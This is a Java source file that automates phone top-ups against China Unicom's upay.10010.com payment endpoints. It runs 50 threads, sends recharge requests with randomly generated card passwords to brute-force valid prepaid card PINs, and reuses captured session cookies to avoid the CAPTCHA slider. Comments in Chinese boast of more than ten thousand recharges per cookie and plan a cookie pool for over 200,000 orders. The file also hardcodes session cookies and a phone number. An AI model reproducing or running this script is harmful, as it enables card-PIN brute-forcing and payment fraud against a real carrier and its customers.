package com.kane.test;

import com.alibaba.fastjson.JSONObject;
import net.dongliu.requests.RawResponse;
import net.dongliu.requests.Requests;
import org.apache.commons.lang3.RandomUtils;
import org.jsoup.Jsoup;
import org.jsoup.nodes.Document;
import org.jsoup.nodes.Element;

import java.util.HashMap;
import java.util.Map;
import java.util.Objects;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

/**
 * <dependency>
 * <groupId>net.dongliu</groupId>
 * <artifactId>requests</artifactId>
 * <version>4.18.2</version>
 * </dependency>
 *
 * <dependency>
 * <groupId>org.jsoup</groupId>
 * <artifactId>jsoup</artifactId>
 * <version>1.7.2</version>
 * </dependency>
 */
public class Test {
    public static void main(String[] args) {
        ExecutorService executorService = Executors.newFixedThreadPool(50);
        int[] ints = new int[]{0};
        //这四个是昨天搞出来的可用cookie，充值几百单后变成不可用，今天又都可用了，切换网络后依旧有效
        //本来想把这些cookie变成不可用，再过一段时间看下是否会变成可用，结果几个cookie各充值了1万多笔，还是都可用。。。
        //若是原本可用的cookie变不可用后，雪藏一段时间后又会变成可用且耐用，那搞个cookie池，循环利用，若有20个，一次循环就能充值20万单以上
        //方式可行简单，也不需要代理啥的，巨大缺陷是，cookie可用性无法控制，若忽然都不可用了，会导致充值通道直接关停
        //前期可手动搞些cookie，若是确实可行，后续再研究下如何自动补充可用cookie
//        String cookies = "upay_user=bf06ef5e8b0dc52baebdbd4495b1bed4";
//        String cookies = "upay_user=bcd50ed7928c281769694e5de9c5fc93";
//        String cookies = "upay_user=e793683f03d6bbff6d88858a243b6a27";
//        String cookies = "upay_user=dc95511c44f4a602579e868deeec3fd1"; //可用
        String  cookies = "upay_user=6c8d4b7606163abe4439e9747102cb30";
        String phoneNo = "17689973219";


        for (int i = 0; i < 100; i++) {
            String finalCardPwd = getCard();
            executorService.execute(() -> {
                synchronized (Test.class) {
                    System.out.println("计数：" + ints[0]++);
                }
                //cookie可用性校验
                String needCodeUrl = "https://upay.10010.com/npfweb/NpfWeb/needCode?pageType=01";
                Map<String, String> needCodeHeader = new HashMap<>();
                needCodeHeader.put("Cookie", cookies);
                needCodeHeader.put("Accept", "text/plain, */*; q=0.01");
                needCodeHeader.put("Accept-Language", "zh-cn");
                needCodeHeader.put("Host", "upay.10010.com");
                needCodeHeader.put("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.2 Safari/605.1.15");
                needCodeHeader.put("Referer", "https://upay.10010.com/npfweb/npfcellweb/phone_recharge_fill.htm");
                needCodeHeader.put("Accept-Encoding", "br, gzip, deflate");
                needCodeHeader.put("Connection", "keep-alive");
                needCodeHeader.put("X-Requested-With", "XMLHttpRequest");
                RawResponse needCodeSend = Requests.get(needCodeUrl).headers(needCodeHeader).socksTimeout(15000).send();
                if (needCodeSend.getStatusCode() != 200) {
                    System.out.println("cookie可用性校验请求异常：" + needCodeSend.getStatusCode());
                    return;
                }
                String s = needCodeSend.readToText();
                if (Objects.equals(s, "yes\n")) {
                    //todo cookie不可用了
                    System.out.println("cookie已失效");
                    return;
                }

                //充值校验请求
                String reChargeCheckUrl = "https://upay.10010.com/npfweb/NpfWeb/reCharge/reChargeCheck";
                Map<String, String> reChargeCheckParam = new HashMap<>();
                //cookie可用时，不需要ticketNew滑块票据参数，后面那些参数需要具体去分析填充，这边测试直接写死
//            reChargeCheckParam.put("ticketNew", "gdtLqw8pO0oONsNBGUkxTUlQaQc4_zHJEfiprxMQaokWVekhNeMkKKcMgyUlEHjRkIZ5k11Q5GA*");
                reChargeCheckParam.put("secstate.state", "3mCBuETgA/YTbuZO79gHFA==^@^0.0.1");
                reChargeCheckParam.put("commonBean.userChooseMode", "0");
                reChargeCheckParam.put("commonBean.phoneNo", phoneNo);
                reChargeCheckParam.put("phoneNo", "");
                reChargeCheckParam.put("commonBean.provinceCode", "");
                reChargeCheckParam.put("commonBean.cityCode", "");
                reChargeCheckParam.put("cardBean.cardValueCode", "04");
                reChargeCheckParam.put("offerPriceStrHidden", "100.00");
                reChargeCheckParam.put("offerRateStrHidden", "1");
                reChargeCheckParam.put("cardBean.cardValue", "100");
                reChargeCheckParam.put("cardBean.minCardNum", "1");
                reChargeCheckParam.put("cardBean.maxCardNum", "3");
                reChargeCheckParam.put("MaxThreshold01", "15");
                reChargeCheckParam.put("MinThreshold01", "1");
                reChargeCheckParam.put("MaxThreshold02", "10");
                reChargeCheckParam.put("MinThreshold02", "1");
                reChargeCheckParam.put("MaxThreshold03", "6");
                reChargeCheckParam.put("MinThreshold03", "1");
                reChargeCheckParam.put("MaxThreshold04", "3");
                reChargeCheckParam.put("MinThreshold04", "1");
                reChargeCheckParam.put("MaxThreshold10", "1");
                reChargeCheckParam.put("MinThreshold10", "1");
                reChargeCheckParam.put("MaxThreshold05", "1");
                reChargeCheckParam.put("MinThreshold05", "1");
                reChargeCheckParam.put("MaxThreshold06", "1");
                reChargeCheckParam.put("MinThreshold06", "1");
                reChargeCheckParam.put("numberType", "");
                reChargeCheckParam.put("pointBean.pointNumber", "");
                reChargeCheckParam.put("commonBean.serviceNo", "");
                reChargeCheckParam.put("pointBean.payMethod", "");
                reChargeCheckParam.put("commonBean.bussTypeIn", "");
                reChargeCheckParam.put("actionPayFeeInfo.actionConfigId", "");
                reChargeCheckParam.put("commonBean.payAmount", "100.00");
                reChargeCheckParam.put("rechargeBean.cardPwd", finalCardPwd);
                reChargeCheckParam.put("commonBean.channelType", "101");
                reChargeCheckParam.put("commonBean.bussineType", "");
                reChargeCheckParam.put("ifShowInvoice", "false");
                Map<String, String> reChargeCheckHeader = new HashMap<>();
                reChargeCheckHeader.put("Cookie", cookies);
                reChargeCheckHeader.put("Accept", "application/json, text/javascript, */*; q=0.01");
                reChargeCheckHeader.put("Accept-Language", "zh-cn");
                reChargeCheckHeader.put("Host", "upay.10010.com");
                reChargeCheckHeader.put("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.2 Safari/605.1.15");
                reChargeCheckHeader.put("Referer", "https://upay.10010.com/npfweb/npfcellweb/phone_recharge_fill.htm");
                reChargeCheckHeader.put("Accept-Encoding", "br, gzip, deflate");
                reChargeCheckHeader.put("Connection", "keep-alive");
                reChargeCheckHeader.put("X-Requested-With", "XMLHttpRequest");
                RawResponse reChargeCheckSend = Requests.get(reChargeCheckUrl).params(reChargeCheckParam).headers(reChargeCheckHeader).socksTimeout(15000).send();
                if (reChargeCheckSend.getStatusCode() != 200) {
                    System.out.println("充值校验请求异常：" + reChargeCheckSend.getStatusCode());
                    return;
                }
                String readToText = reChargeCheckSend.readToText();
                System.out.println("充值校验响应：" + readToText);
                JSONObject jsonObject = JSONObject.parseObject(readToText);
                String out = jsonObject.getString("out");
                if (!Objects.equals(out, "success")) {
                    System.out.println("充值校验异常：" + out);
                    if (Objects.equals(out, "验证码校验异常!")) {
                        //todo cookie不可用了
                        System.out.println("cookie已失效");
                    }
                    return;
                }
                String secstate = jsonObject.getString("secstate");

                //充值确认请求
                String reChargeConfirmUrl = "https://upay.10010.com/npfweb/NpfWeb/reCharge/reChargeConfirm";
                Map<String, String> reChargeConfirmParam = new HashMap<>();
                reChargeConfirmParam.put("bussineTypeInput", "0");
                reChargeConfirmParam.put("secstate.state", secstate);
                Map<String, String> reChargeConfirmHeader = new HashMap<>();
                reChargeConfirmHeader.put("Cookie", cookies);
                reChargeConfirmHeader.put("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
                reChargeConfirmHeader.put("Content-Type", "application/x-www-form-urlencoded");
                reChargeConfirmHeader.put("Origin", "https://upay.10010.com");
                reChargeConfirmHeader.put("Accept-Language", "zh-cn");
                reChargeConfirmHeader.put("Host", "upay.10010.com");
                reChargeConfirmHeader.put("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.2 Safari/605.1.15");
                reChargeConfirmHeader.put("Referer", "https://upay.10010.com/npfweb/NpfWeb/reCharge/reChargeApplay");
                reChargeConfirmHeader.put("Accept-Encoding", "br, gzip, deflate");
                reChargeConfirmHeader.put("Connection", "keep-alive");
                RawResponse reChargeConfirmSend = Requests.post(reChargeConfirmUrl).params(reChargeConfirmParam).headers(reChargeConfirmHeader).socksTimeout(15000).send();
                if (reChargeConfirmSend.getStatusCode() != 200) {
                    System.out.println("充值确认请求异常：" + reChargeConfirmSend.getStatusCode());
                    return;
                }
                Document parse = Jsoup.parse(reChargeConfirmSend.readToText());
                Element inforFill = parse.getElementsByClass("infor-fill").first();
                System.out.println("充值结果：" + inforFill.text());
                //todo 解析具体节点，判断充值成功还是失败
            });

        }
        executorService.shutdown();

    }

    private static String getCard(){
        String cardPwd =  "980";
        for (int i = 0; i < 16; i++) {
            cardPwd = cardPwd + RandomUtils.nextLong(0,9);
        }
//        cardPwd = "1111111111111111111";
        System.out.println("card:" + cardPwd);
        return cardPwd;
    }
}
